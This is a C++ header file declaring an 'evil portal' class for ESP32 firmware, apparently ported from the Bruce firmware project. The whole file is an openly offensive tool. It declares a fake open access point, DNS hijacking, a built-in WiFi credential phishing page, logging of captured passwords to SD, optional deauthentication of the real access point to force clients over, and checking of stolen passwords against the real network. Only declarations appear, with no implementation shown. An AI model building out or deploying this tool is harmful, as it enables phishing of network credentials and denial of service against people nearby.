#pragma once
// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  Bruce Evil Portal — Full Captive Portal Implementation                  ║
// ║  Ported from Bruce firmware v1.14 (Apache 2.0)                           ║
// ║                                                                           ║
// ║  Features:                                                                ║
// ║   • Starts a soft AP with a configurable SSID                            ║
// ║   • DNS hijacking: all queries → captive portal IP                       ║
// ║   • HTTP server serving custom portal HTML from SD or built-in default   ║
// ║   • Captures submitted credentials (SSID/password) to SD                 ║
// ║   • Optional: simultaneous deauth on real AP to force clients over       ║
// ║   • Optional WPA verification mode: attempt real connection with creds   ║
// ╚══════════════════════════════════════════════════════════════════════════╝
#include <stdint.h>
#include <string>
#include <vector>
#include <functional>
#include "esp_http_server.h"
#include "lwip/sockets.h"

// Callback: fires every time credentials are captured
using CredentialCb = std::function<void(const std::string& ssid,
                                         const std::string& password,
                                         const std::string& clientMac)>;

class EvilPortal {
public:
    struct Config {
        std::string apSsid        = "Free WiFi";  // Fake AP name
        std::string htmlFile      = "";            // SD path to custom HTML, or "" for default
        bool        deauthTarget  = false;         // Simultaneously deauth real AP
        uint8_t     targetBssid[6]= {};            // AP to deauth (if deauthTarget=true)
        uint8_t     channel       = 6;             // AP channel
        bool        verifyPwd     = false;         // Try real WPA connection to verify creds
        std::string credFile      = "/sdcard/bruce_portal_creds.txt";
    };

    EvilPortal() = default;
    ~EvilPortal() { stop(); }

    bool start(const Config& cfg, CredentialCb onCred = nullptr);
    void stop();
    bool isRunning() const { return m_running; }

    // Stats
    int capturedCount() const { return m_capturedCount; }
    const std::vector<std::string>& capturedCreds() const { return m_creds; }

    // Build the default portal HTML (WiFi credential phishing page)
    static std::string defaultPortalHtml(const std::string& ssid);

private:
    bool        m_running       = false;
    int         m_capturedCount = 0;
    Config      m_cfg;
    CredentialCb m_onCred;
    httpd_handle_t m_server     = nullptr;
    int         m_dnsSock       = -1;
    TaskHandle_t m_dnsTask      = nullptr;
    TaskHandle_t m_deauthTask   = nullptr;
    std::string m_portalHtml;
    std::vector<std::string> m_creds;

    bool startAP();
    bool startHttpServer();
    bool startDnsServer();
    void stopAP();

    void logCredential(const std::string& ssid, const std::string& pwd,
                       const std::string& mac);

    // HTTP handler helpers (must be static for ESP-IDF httpd)
    static esp_err_t handlerRoot   (httpd_req_t* r);
    static esp_err_t handlerPost   (httpd_req_t* r);
    static esp_err_t handlerFavicon(httpd_req_t* r);
    static esp_err_t handlerCatch  (httpd_req_t* r);

    // DNS hijack task
    static void dnsTask(void* arg);

    // Deauth task
    static void deauthTask(void* arg);

    static EvilPortal* s_instance;  // singleton pointer for static callbacks
};
